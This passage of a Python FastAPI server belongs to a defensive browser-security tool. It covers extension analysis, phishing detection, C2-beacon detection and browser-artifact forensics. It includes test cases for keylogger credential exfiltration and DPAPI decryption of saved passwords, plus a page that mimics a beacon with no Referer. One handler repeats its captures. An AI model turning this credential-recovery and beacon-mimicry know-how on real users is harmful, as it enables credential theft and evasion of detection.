    ctx["gate"].clear()
    await ctx["queue"].put({"type": "step", "id": ctx["id"], "msg": msg})
    await ctx["gate"].wait()


@app.post("/dev/test_step")
async def dev_test_step():
    if _STEP_CTX is not None:
        _STEP_CTX["gate"].set()
    return {"ok": True, "waiting": _STEP_CTX is not None}


_ALL_TEST_CASES = [
    {"id":"c1_benign",    "component":"c1","label":"Benign manifest → no risk flags",         "fn":_tc_c1_benign_manifest},
    {"id":"c1_malicious", "component":"c1","label":"Malicious manifest → 4 high-risk flags",  "fn":_tc_c1_malicious_manifest},
    {"id":"c1_code_eval", "component":"c1","label":"Code: eval + atob + fetch + cookie detected","fn":_tc_c1_code_eval_detection},
    {"id":"c1_entropy",   "component":"c1","label":"Shannon entropy: obfuscated > clean",      "fn":_tc_c1_entropy},
    {"id":"c2_url_phish", "component":"c2","label":"URL: paypal-secure-login.yolasite.com flagged","fn":_tc_c2_url_phishing},
    {"id":"c2_url_clean", "component":"c2","label":"URL: google.com scores below threshold",  "fn":_tc_c2_url_benign},
    {"id":"c2_verified",  "component":"c2","label":"Verified domain: google.com → VERIFIED, free-host phish not trusted","fn":_tc_c2_verified_domain},
    {"id":"c2_form_off",  "component":"c2","label":"Form: off-domain POST → score > 0.5",     "fn":_tc_c2_form_offsite},
    {"id":"c2_form_same", "component":"c2","label":"Form: same-domain POST → score = 0",      "fn":_tc_c2_form_samedomain},
    {"id":"c2_browser_phish","component":"c2","label":"[Browser] BitB phishing page → detected live","fn":_tc_c2_browser_phish,"browser":True},
    {"id":"c2_browser_clean","component":"c2","label":"[Browser] Clean page → low score",     "fn":_tc_c2_browser_clean,"browser":True},
    {"id":"c2_kit_windows","component":"c2","label":"[Browser] Real mrd0x BitB kit (Windows) rendered live → PHISHING","fn":_tc_c2_kit_windows,"browser":True},
    {"id":"c2_kit_macos","component":"c2","label":"[Browser] Real mrd0x BitB kit (macOS) rendered live → PHISHING","fn":_tc_c2_kit_macos,"browser":True},
    {"id":"c2_scenario_oauth","component":"c2","label":"Scenario: fake Microsoft OAuth popup on lookalike domain → PHISHING","fn":_tc_c2_scenario_oauth},
    {"id":"c2_scenario_freehost","component":"c2","label":"Scenario: PayPal credential harvester on free hosting → flagged","fn":_tc_c2_scenario_freehost},
    {"id":"c2_scenario_compromised","component":"c2","label":"Scenario: BitB kit on a compromised legit domain (clean URL) → PHISHING","fn":_tc_c2_scenario_compromised},
    {"id":"c2_runtime_keylogger","component":"c2","label":"[Browser] Keylogger + off-origin credential exfil → L6 fires, block overlay shown","fn":_tc_c2_runtime_keylogger,"browser":True},
    {"id":"c2_benign_login","component":"c2","label":"[Browser] Realistic legitimate bank login → stays SAFE (no false positive)","fn":_tc_c2_benign_login,"browser":True},
    {"id":"c3_real_c2",      "component":"c3","label":"Real Zeus C2 traffic (CTU Botnet-25-1): 317 s timer → BEACON, still flagged after its sleep changes","fn":_tc_c3_real_c2},
    {"id":"c3_real_browsing","component":"c3","label":"Real human browsing (CTU-Normal-30), user assumed away → SAFE","fn":_tc_c3_real_browsing},
    {"id":"c3_real_session", "component":"c3","label":"Real 60-minute browsing session: its most beacon-like hosts stay below BEACON","fn":_tc_c3_real_session},
    {"id":"c3_jitter_beacon","component":"c3","label":"Cobalt Strike-style beacon (sleep 5 s, 20 % jitter) → steady-rhythm rule + ML → BEACON","fn":_tc_c3_jitter_beacon},
    {"id":"c3_fusion_rules", "component":"c3","label":"Risk fusion: BEACON needs both engines, reputation never moves the score","fn":_tc_c3_fusion_rules},
    {"id":"c3_live_beacon",  "component":"c3","label":"[Browser] TC-02 Live beacon in a real tab (POST every 3 s, no Referer) → captured and confirmed BEACON","fn":_tc_c3_live_beacon,"browser":True},
    {"id":"c3_ngrok_beacon", "component":"c3","label":"[Browser] TC-03 Real-world beacon over a public ngrok tunnel → BEACON with a live AbuseIPDB/VirusTotal lookup","fn":_tc_c3_ngrok_beacon,"browser":True},
    {"id":"c4_live_hist", "component":"c4","label":"[Browser] Auto-launches browser, tours 15 real sites (incl. Sri Lanka), reads history back","fn":_tc_c4_live_history,"browser":True},
    {"id":"c4_live_dl",   "component":"c4","label":"[Browser] Real file download → sha256 hashed off disk","fn":_tc_c4_live_download,"browser":True},
    {"id":"c4_live_mal",  "component":"c4","label":"[Browser] EICAR test file downloaded live → C4's dangerous-download rule fires for real","fn":_tc_c4_live_malware_download,"browser":True},
    {"id":"c4_live_ck",   "component":"c4","label":"Live profile: cookies acquired from the session (DB is locked)","fn":_tc_c4_live_cookies},
    {"id":"c4_live_login_plant","component":"c4","label":"[Browser] Plants a real saved login into the live profile's Login Data store","fn":_tc_c4_live_login_plant,"browser":True},
    {"id":"c4_live_login","component":"c4","label":"Live profile: Login Data store + DPAPI master key recovery","fn":_tc_c4_live_logins},
    {"id":"c4_live_ext",  "component":"c4","label":"Live profile: extensions from Secure Preferences","fn":_tc_c4_live_extensions},
    {"id":"c4_live_sess", "component":"c4","label":"Live profile: restorable tabs from the SNSS session store","fn":_tc_c4_live_sessions},
    {"id":"c4_case",      "component":"c4","label":"Evidence: breach profile planted as real Chrome SQLite","fn":_tc_c4_case_build},
    {"id":"c4_extract",   "component":"c4","label":"Stage 1: extractor parses all 7 artifact types off disk","fn":_tc_c4_extract},
    {"id":"c4_crypto",    "component":"c4","label":"Stage 1b: saved passwords decrypted via DPAPI + AES-256-GCM","fn":_tc_c4_crypto},
    {"id":"c4_rules",     "component":"c4","label":"Stage 2: rules R01-R06 all fire on the planted case","fn":_tc_c4_rules},
    {"id":"c4_det_a",     "component":"c4","label":"Detector A: co-occurrence — 4 artifact types, one domain","fn":_tc_c4_det_cooccurrence},
    {"id":"c4_det_b",     "component":"c4","label":"Detector B: orphan — cookie/localStorage, no history","fn":_tc_c4_det_orphan},
    {"id":"c4_det_c",     "component":"c4","label":"Detector C: temporal — 03:00 vs this user's own baseline","fn":_tc_c4_det_temporal},
    {"id":"c4_det_d",     "component":"c4","label":"Detector D: attack chain — browse→download.exe→credential","fn":_tc_c4_det_chain},
    {"id":"c4_det_e",     "component":"c4","label":"Detector E: domain risk clustering — breach domain ranks #1","fn":_tc_c4_det_cluster},
    {"id":"c4_det_f",     "component":"c4","label":"Detector F: credential reuse — one identity, three domains","fn":_tc_c4_det_reuse},
    {"id":"c4_det_g",     "component":"c4","label":"Detector G: download → exfiltration navigation","fn":_tc_c4_det_exfil},
    {"id":"c4_mitre",     "component":"c4","label":"Stage 4: every finding mapped to MITRE ATT&CK","fn":_tc_c4_mitre},
    {"id":"c4_report",    "component":"c4","label":"Stage 5: HTML report + SIEM export written to disk","fn":_tc_c4_report},
    {"id":"c4_verdict",   "component":"c4","label":"Stage 6: risk score and verdict for the case","fn":_tc_c4_verdict},
    {"id":"c4_integrity", "component":"c4","label":"Forensic integrity: evidence unchanged after analysis","fn":_tc_c4_integrity},
    {"id":"c4_coverage",  "component":"c4","label":"Coverage: every C4 function executed on this case","fn":_tc_c4_coverage},
]


@app.get("/dev/run_tests_stream")
async def run_tests_stream_endpoint(component: str = "all", step: bool = False, case: str = ""):
    """SSE stream: runs test cases one by one and emits results. With step=1,
    cases narrate via _step() and pause until POST /dev/test_step. `case`, when
    given, narrows the run to that one case id (e.g. c3_ngrok_beacon)."""
    cases = [tc for tc in _ALL_TEST_CASES
             if (component == "all" or tc["component"] == component)
             and (not case or tc["id"] == case)]

    async def generate():
        global _STEP_CTX
        total = len(cases)
        yield f"data: {json.dumps({'type':'init','total':total,'step':step})}\n\n"
        passed = 0
        failed = 0
        for i, tc in enumerate(cases):
            yield f"data: {json.dumps({'type':'start','index':i,'id':tc['id'],'label':tc['label'],'component':tc['component'],'browser':tc.get('browser',False)})}\n\n"
            start = _time.time()
            try:
                if step:
                    queue, gate = asyncio.Queue(), asyncio.Event()
                    _STEP_CTX = {"queue": queue, "gate": gate, "id": tc["id"]}
                    task = asyncio.create_task(tc["fn"]())
                    try:
                        while True:
                            getter = asyncio.ensure_future(queue.get())
                            done, _ = await asyncio.wait(
                                {task, getter}, return_when=asyncio.FIRST_COMPLETED)
                            if getter in done:
                                yield f"data: {json.dumps(getter.result())}\n\n"
                            else:
                                getter.cancel()
                                result = task.result()  # re-raises fn exceptions
                                break
                    finally:
                        _STEP_CTX = None
                        if not task.done():
                            task.cancel()
                else:
                    result = await tc["fn"]()
                elapsed = round(_time.time() - start, 2)
                passed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'pass','elapsed':elapsed,'detail':result.get('detail',''),'browser_url':result.get('browser_url','')})}\n\n"
            except AssertionError as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'fail','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            except Exception as e:
                elapsed = round(_time.time() - start, 2)
                failed += 1
                yield f"data: {json.dumps({'type':'result','id':tc['id'],'status':'error','elapsed':elapsed,'detail':str(e),'browser_url':''})}\n\n"
            # small pause between tests so browser has time to display the page
            await asyncio.sleep(0.3)
        yield f"data: {json.dumps({'type':'done','passed':passed,'failed':failed,'total':total})}\n\n"

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
    )


@app.post("/dev/simulate_click")
async def dev_simulate_click():
    _BASE = os.path.dirname(os.path.abspath(__file__))
    ext_dir = os.path.join(_BASE, "c1", "test_malicious_ext")
    if not os.path.isdir(ext_dir):
        raise HTTPException(status_code=404,
            detail="test_malicious_ext directory not found next to main.py")
    manifest_path = os.path.join(ext_dir, "manifest.json")
    with open(manifest_path, encoding="utf-8") as f:
        manifest_dict = json.load(f)
    # Concatenate every .js file, exactly as parse_crx_bytes() does for a real
    # downloaded extension. Reading only background.js used to hide anything a
    # content script did (keystroke listeners live there, not in the worker),
    # so the simulated click scored lower than the same extension would if it
    # arrived from the Web Store.
    source_parts = []
    for root, _dirs, files in os.walk(ext_dir):
        for name in sorted(files):
            if name.lower().endswith(".js"):
                with open(os.path.join(root, name), encoding="utf-8", errors="ignore") as f:
                    source_parts.append(f.read())
    source_code = "\n".join(source_parts)
    fake_ext_id  = "test_malicious_ext_simulate"
    fake_url     = "https://chromewebstore.google.com/detail/websentinel-test/simulate"
    asyncio.create_task(_simulate_click_task(
        json.dumps(manifest_dict), source_code, ext_dir, fake_ext_id, fake_url
    ))
    return {"status": "simulation started — watch the C1 Live tab"}


async def _simulate_click_task(manifest_str, source_code, ext_path, ext_id, webstore_url):
    print(f"[C1-SIM] Simulating 'Add to Chrome' click: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        static_result    = await analyze_extension_c1(manifest_str, source_code, ext_id)
        static_score_pct = static_result["static"]["score"] * 100
        if static_score_pct >= 50.0:
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                               "url": webstore_url, "state": "sandbox_running",
                               "static_score": round(static_score_pct, 1)})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                    extension_path=ext_path)
        else:
            c1_result = static_result
        _store_c1_result(c1_result, "simulated_click", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}
        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1-SIM] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1-SIM] FAILED: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.get("/session/pending_installs")
async def get_pending_installs():
    return {
        ext_id: {"verdict": v["c1_result"]["verdict"], "score": v["c1_result"]["score"],
                 "webstore_url": v["webstore_url"]}
        for ext_id, v in _pending_installs.items()
    }


# ══════════════════════════════════════════════════════════════════════════════
#  C3: Browser Execution-Aware C2 Beacon Detector
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/c3/status")
async def c3_status():
    return c3_analyzer.status()


@app.get("/c3/alerts")
async def c3_alerts(limit: int = 50):
    return c3_alert_store.list_alerts(limit)


# ── Analyst feedback loop (the 2026-09-11 hardening pass, step 8) ─────────
# Literal paths MUST be registered before /c3/alerts/{alert_id} would match
# them. There is no such catch-all route on C3 today, but C2's ARCHITECTURE.md
# records this exact bug biting that component ("Route order matters"), so the
# ordering is kept deliberately rather than by luck.
@app.get("/c3/alerts/feedback/stats")
async def c3_feedback_stats():
    return c3_alert_store.feedback_stats()


@app.get("/c3/alerts/feedback/export")
async def c3_feedback_export():
    rows = c3_alert_store.export_feedback()
    return {"export_type": "c3_analyst_feedback", "export_version": 1,
            "generated_at": datetime.now().isoformat(),
            "total_events": len(rows), "events": rows}


@app.post("/c3/alerts/{alert_id}/feedback")
async def c3_set_feedback(alert_id: int, body: dict | None = None):
    body = body or {}
    try:
        return c3_alert_store.set_feedback(
            alert_id, str(body.get("verdict") or ""), str(body.get("note") or ""))
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc))
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))


@app.get("/c3/hosts")
async def c3_hosts():
    return c3_analyzer.hosts()


@app.get("/c3/hosts/{host:path}")
async def c3_host_detail(host: str):
    return c3_analyzer.host_detail(host)


@app.get("/c3/requests")
async def c3_requests(limit: int = 50):
    return c3_analyzer.recent_requests(limit)


@app.post("/c3/hosts/{host:path}/unblock")
async def c3_unblock_host(host: str):
    await c3_interceptor.unblock_host(host)
    return c3_analyzer.status()


# NOTE ON ROUTE ORDER: this must stay registered *after* /unblock above.
# {host:path} matches slashes, so "/c3/hosts/example.com/unblock" would also
# satisfy this pattern with host="example.com/un".  Starlette matches routes in
# registration order, so /unblock claims that URL first and this route only ever
# sees a genuine .../block.  Do not move this above the unblock route.
@app.post("/c3/hosts/{host:path}/block")
async def c3_block_host(host: str):
    """Manually block a host (the 'Block Host' quick action on a C3 alert card).

    Calls the same interceptor path the opt-in auto-block uses, so a manual
    block and an automatic block are the same operation.
    """
    await c3_interceptor.block_host(host, reason="manual block via dashboard")
    return c3_analyzer.status()


@app.post("/c3/auto-block/enable")
async def c3_auto_block_enable():
    return c3_analyzer.enable_auto_block()


@app.post("/c3/auto-block/disable")
async def c3_auto_block_disable():
    return c3_analyzer.disable_auto_block()


@app.post("/c3/collect/start")
async def c3_collect_start(req: C3CollectReq):
    return c3_analyzer.start_collection(req.label)


@app.post("/c3/collect/stop")
async def c3_collect_stop():
    return c3_analyzer.stop_collection()


@app.post("/c3/collect/export")
async def c3_collect_export():
    return c3_analyzer.export_collection()


@app.get("/c3/test/beacon-target")
async def c3_test_beacon_target():
    return {"ok": True, "component": "c3", "target": "beacon",
            "timestamp": datetime.now().isoformat()}


@app.post("/c3/test/beacon-target")
async def c3_test_beacon_target_post(body: dict | None = None):
    return {"ok": True, "component": "c3", "target": "beacon",
            "received": body or {}, "timestamp": datetime.now().isoformat()}


@app.get("/c3/test/beacon-page", response_class=HTMLResponse)
async def c3_test_beacon_page(interval: int = 30000, method: str = "GET"):
    interval = max(1000, min(int(interval), 300000))
    method = "POST" if str(method).upper() == "POST" else "GET"
    body    = "JSON.stringify({ ts: Date.now(), component: 'c3' })" if method == "POST" else "undefined"
    headers = "{ 'Content-Type': 'application/json' }" if method == "POST" else "{}"
    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>C3 Test Beacon</title>
  <style>
    body {{ font-family: system-ui, sans-serif; background:#111827; color:#e5e7eb; padding:24px; }}
    code {{ color:#fbbf24; }}
  </style>
</head>
<body>
  <h1>C3 Test Beacon</h1>
  <p>This page sends a small {method} request every <code>{interval}ms</code>.</p>
  <p>Put this tab in the background to test idle/background beacon detection.</p>
  <pre id="log"></pre>
  <script>
    const log = document.getElementById('log');
    async function tick() {{
      try {{
        // Fixed URL (no cache-busting query string) -- `cache: 'no-store'`
        // already prevents caching. A query string that changes every
        // request (e.g. `?ts=...`) would make this test beacon hit a
        // different "path" on every check-in, which is NOT how real C2
        // beacons behave (they poll one fixed URI) and defeats both the
        // heuristic's "same endpoint" rule and the ML model's URL-diversity
        // feature -- i.e. it would make this demo LESS representative of a
        // real beacon, not more realistic.
        // referrerPolicy 'no-referrer' is REQUIRED for this to represent a
        // real beacon, not optional realism polish. A real C2 implant is a
        // process, not a document: it has no referring page, so it sends no
        // Referer header. A fetch() from this page sends one by default.
        //
        // That single header decides the verdict. referrer_absent_ratio is the
        // model's highest-weighted feature (0.318 importance -- more than all
        // eight timing features combined, which sum to ~0.30). Measured
        // 2026-09-11 without this line: a textbook beacon (iat_cv 0.0016,
        // url_path_entropy 0.0, payload_repeat_ratio 0.98 -- metronomic, one
        // endpoint, identical replies) scored ML 0.126 and fused to 0.3078,
        // i.e. SUSPICIOUS, never BEACON. The detector was not wrong; it was
        // being shown traffic no real beacon produces.
        // See the 2026-09-11 hardening pass, step 5.
        const res = await fetch('/c3/test/beacon-target', {{
          method: '{method}',
          headers: {headers},
          body: {body},
          cache: 'no-store',
          referrerPolicy: 'no-referrer'
        }});
        log.textContent = new Date().toLocaleTimeString() + ' beacon -> ' + res.status + '\\n' + log.textContent;
      }} catch (err) {{
        log.textContent = new Date().toLocaleTimeString() + ' error -> ' + err + '\\n' + log.textContent;
      }}
    }}
    tick();
    setInterval(tick, {interval});
  </script>
</body>
</html>"""


# ══════════════════════════════════════════════════════════════════════════════
#  C4 — Browser Artifact Forensic Correlation Engine
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/forensic/debug")
async def forensic_debug():
    fallback = get_default_profile_path()
    return {
        "component": "C4",
        "playwright_profile_path": PW_PROFILE_DIR,
        "playwright_profile_exists": os.path.isdir(PW_PROFILE_DIR),
        "playwright_session_running": pw_session.is_running,
        "fallback_profile_path": fallback,
        "hint": (
            "C4 scans the Playwright Chromium profile when the session is running. "
            "If databases are locked, stop the session and retry."
        ),
    }


async def _live_cookie_jar():
    """The cookie jar of the running browser, or None when no session is up.

    Chromium keeps an exclusive Windows lock on Network/Cookies for its whole
    lifetime, so a live profile can never be read from the file. Taking the jar
    from the running session is the volatile-acquisition equivalent, and the
    events it produces are labelled as such.
    """
    if not pw_session.is_running:
        return None
    try:
        return await pw_session.context.cookies()
    except Exception:
        return None


@app.post("/forensic/extract")
async def forensic_extract(req: ForensicReq):
    profile_path = req.profile_path
    if not profile_path:
        if pw_session.is_running or os.path.isdir(PW_PROFILE_DIR):
            profile_path = PW_PROFILE_DIR
    live_cookies = await _live_cookie_jar()
    try:
        result = await asyncio.to_thread(run_forensic_analysis, profile_path,
                                         req.save_outputs, live_cookies)
        await _broadcast({"type": "forensic_analysis", "data": get_c4_summary(result)})
        return {"status": "ok", "summary": get_c4_summary(result), "result": result}
    except (FileNotFoundError, ValueError) as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc)) from exc


@app.get("/forensic/report")
async def forensic_report():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "summary": get_c4_summary()}
    return {"status": "ok", "summary": get_c4_summary(result), "result": result}


@app.get("/forensic/summary")
async def forensic_summary():
    return get_c4_summary()


@app.get("/forensic/timeline")
async def forensic_timeline(type: str = "all", flagged: bool = False, limit: int = 300):
    result = get_last_result()
    if not result:
        return {"status": "no_data", "events": []}
    events = result.get("events", [])
    if type != "all":
        events = [e for e in events if e.get("artifact_type") == type]
    if flagged:
        events = [e for e in events if e.get("risk_flag")]
    events = sorted(events, key=lambda e: e.get("timestamp", ""), reverse=True)
    return {"status": "ok", "events": events[:limit]}


@app.get("/forensic/linkchart")
async def forensic_linkchart():
    """Entity/relationship graph for the last C4 scan (built on the fly for scans
    that pre-date the chart)."""
    result = get_last_result()
    if not result:
        return {"status": "no_data", "link_chart": None}
    graph = result.get("link_chart")
    if graph is None:
        from .c4.linkchart import build_link_chart
        graph = build_link_chart(result)
    return {"status": "ok", "link_chart": graph}


@app.get("/forensic/mitre")
async def forensic_mitre():
    result = get_last_result()
    if not result:
        return {"status": "no_data", "findings": []}
    return {"status": "ok",
            "findings": result.get("mitre_result", {}).get("all_findings", [])}


@app.get("/forensic/report/html")
async def forensic_report_html():
    html = render_last_html()
    if not html:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(html, media_type="text/html",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.html"})


@app.get("/forensic/report/json")
async def forensic_report_json():
    data = render_last_json()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('report')}.json"})


@app.get("/forensic/report/siem")
async def forensic_report_siem():
    data = render_last_siem()
    if not data:
        raise HTTPException(status_code=404, detail="No C4 analysis has been run yet")
    return Response(data, media_type="application/json",
        headers={"Content-Disposition": f"attachment; filename={report_filename('siem')}.json"})


# ══════════════════════════════════════════════════════════════════════════════
#  Playwright session endpoints (shared by all components)
# ══════════════════════════════════════════════════════════════════════════════

def _needs_full_capture(url: str) -> bool:
    """False when analyze() will short-circuit (SKIP / whitelist / verified) and won't use
    the DOM/screenshot/runtime — lets the nav handler skip costly capture. Mirrors the
    early-return conditions in analyze()."""
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return False
    u = url.lower()
    for d in settings["whitelist"]:
        if d and d.lower() in u:
            return False
    return not is_verified(url)


def _c2_will_analyze(url: str) -> bool:
    """True when analyze() will actually run layers or a reputation check on this URL."""
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return False
    u = url.lower()
    return not any(d and d.lower() in u for d in settings.get("whitelist", []))


def _c2_layers_for(url: str) -> List[str]:
    """Layer ids that will run for this URL (a verified domain only gets L5)."""
    ly = settings["layers"]
    ids = [f"L{i}" for i in range(1, 7) if ly.get(f"l{i}", True)]
    return [i for i in ids if i == "L5"] if is_verified(url) else ids


def _c2_make_thumbnail(shot_b64: str, width: int = 320) -> str:
    """Downscale a page screenshot to a small JPEG data URI ('' on any failure)."""
    try:
        from PIL import Image
        img = Image.open(_io.BytesIO(_b64.b64decode(shot_b64))).convert("RGB")
        img.thumbnail((width, int(width * 0.75)))
        buf = _io.BytesIO()
        img.save(buf, format="JPEG", quality=55, optimize=True)
        return "data:image/jpeg;base64," + _b64.b64encode(buf.getvalue()).decode()
    except Exception:
        return ""


async def _c2_send_preview(page, tab_id: int, url: str, shot_b64: str = "") -> None:
    """Send a small thumbnail of the analysed page to the live view. Memory only —
    never written to the alert store."""
    try:
        if page.is_closed():
            return
        if not shot_b64:
            shot_b64 = await pw_session.get_screenshot_b64(page)
        if not shot_b64:
            return
        thumb = await asyncio.to_thread(_c2_make_thumbnail, shot_b64)
        if thumb:
            await _broadcast({"type": "c2_preview", "tab_id": tab_id, "url": url, "preview": thumb})
    except Exception:
        pass


async def _pw_nav_handler(url: str, page=None) -> None:
    """C2 phishing analysis on every navigation. C1 runs on click, not navigation."""
    _t0 = _time.perf_counter()
    tab_id = pw_session.tab_id(page) if page is not None else 0
    # Tell the live view straight away that this tab is being analysed, and let
    # every layer report in as it finishes (see _c2_emit_layer in analyze()).
    if _c2_will_analyze(url):
        await _broadcast({"type": "c2_analysis_start", "tab_id": tab_id, "url": url,
                          "layers": _c2_layers_for(url)})
    _c2_live_ctx.set({"tab_id": tab_id, "url": url})
    c3_tagger.record_navigation(url)
    dom        = await pw_session.get_dom()
    screenshot = await pw_session.get_screenshot_b64()
    title      = await pw_session.get_title()
    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot)
    """C2 phishing analysis on every navigation. C1 runs on click, not navigation.
    Reads from the specific `page` that navigated so each tab is analyzed independently."""
    # Skip the expensive captures for URLs analyze() will short-circuit (skip/whitelist/
    # verified); for the rest, only screenshot when L3 can actually use it.
    if _needs_full_capture(url):
        dom = await pw_session.get_dom(page)
        if _L3_HAS_HASHES and settings.get("layers", {}).get("l3", True):
            screenshot = await pw_session.get_screenshot_b64(page)
        else:
            screenshot = ""
        runtime = await pw_session.get_runtime_signals(
            active_probe=settings.get("runtime_active_probe", False), page=page)
    else:
        dom, screenshot, runtime = "", "", {}
    title      = await pw_session.get_title(page)
    req        = AnalyzeReq(url=url, dom=dom, screenshot=screenshot, runtime=runtime)
    result     = await analyze(req)
    result["duration_ms"] = round((_time.perf_counter() - _t0) * 1000)
    # If the tab was closed while this analysis was in flight, don't emit a stale card.
    if page is not None:
        try:
            if page.is_closed():
                return
        except Exception:
            pass
        result["tab_id"] = pw_session.tab_id(page)
        result["title"]  = title
    await _broadcast({"type": "analysis",   "data": result})
    await _broadcast({"type": "url_change", "url": url, "title": title})
    # The thumbnail follows as its own message so it never delays the verdict.
    if page is not None and settings.get("live_preview", True) and result.get("verdict") not in ("SKIP", "WHITELISTED"):
        asyncio.create_task(_c2_send_preview(page, tab_id, url, screenshot))

    # Threshold-driven in-browser interstitial (warning / blocking + continue) — on the
    # tab that navigated, so it never leaks onto another tab.
    if settings.get("interstitial_enabled", True):
        score = result.get("risk_score", 0)
        if score >= settings.get("block_threshold", 60):
            await pw_session.inject_interstitial("block", result, page=page)
        elif score >= settings.get("warn_threshold", 30):
            await pw_session.inject_interstitial("warn", result, page=page)


async def _pw_tab_closed(tab_id: int) -> None:
    """Tell the dashboard to drop a tab's live card when its browser tab closes."""
    await _broadcast({"type": "tab_closed", "tab_id": tab_id})


async def _bg_start_session() -> None:
    global _session_starting
    try:
        await pw_session.start()
        # C3 — attach network interceptor and start analysis loop
        await c3_tagger.setup(pw_session.context)
        await c3_interceptor.start(pw_session)
        await c3_analyzer.start_loop(pw_session, _broadcast)
        home = settings.get("pw_home_url", "").strip()
        if home:
            try:
                await pw_session.navigate(home)
            except Exception:
                pass
        url = await pw_session.current_url()
        await _broadcast({"type": "session_started", "url": url})
    except Exception as exc:
        print(f"[Session] Start failed: {exc}")
        await _broadcast({"type": "session_error", "message": str(exc)})
    finally:
        _session_starting = False


@app.get("/session/status")
async def session_status():
    url = await pw_session.current_url() if pw_session.is_running else ""
    return {"running": pw_session.is_running, "url": url}


@app.post("/session/start")
async def session_start():
    global _session_starting
    if pw_session.is_running:
        return {"status": "already_running"}
    if _session_starting:
        return {"status": "starting"}
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    pw_session.add_close_callback(_pw_tab_closed)
    asyncio.create_task(_bg_start_session())
    return {"status": "starting"}


@app.post("/session/stop")
async def session_stop():
    global _session_starting
    _session_starting = False
    # Tear down C3 before closing the browser
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()
    await _broadcast({"type": "session_stopped"})
    return {"status": "stopped"}


@app.post("/session/navigate")
async def session_navigate(req: NavigateReq):
    url = req.url.strip()
    if not url:
        raise HTTPException(status_code=400, detail="url required")
    if not pw_session.is_running and _session_starting:
        for _ in range(20):
            await asyncio.sleep(0.25)
            if pw_session.is_running:
                break
    if not pw_session.is_running:
        raise HTTPException(status_code=400, detail="Playwright session not running")
    return {"url": await pw_session.navigate(url)}


# Background tabs (the 2026-09-11 hardening pass, step 7). The session drove
# a single page until 2026-09-11, so background_tab_ratio was structurally 0.0
# and the background-tab beacon scenario could not be exercised at all.
@app.post("/session/background_tab")
async def session_background_tab(req: NavigateReq):
    url = req.url.strip()
    if not url:
        raise HTTPException(status_code=400, detail="url required")
    if not pw_session.is_running:
        raise HTTPException(status_code=400, detail="Playwright session not running")
    return await pw_session.open_background_tab(url)


@app.post("/session/background_tab/close_all")
async def session_close_background_tabs():
    if not pw_session.is_running:
        raise HTTPException(status_code=400, detail="Playwright session not running")
    return await pw_session.close_background_tabs()


# ══════════════════════════════════════════════════════════════════════════════
#  WebSocket — real-time event stream
# ══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws/events")
async def ws_events(websocket: WebSocket):
    await websocket.accept()
    _ws_clients.add(websocket)
    await websocket.send_json({
        "type":            "init",
        "session_running": pw_session.is_running,
        "url":             await pw_session.current_url() if pw_session.is_running else "",
    })
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        _ws_clients.discard(websocket)
    except Exception:
        _ws_clients.discard(websocket)
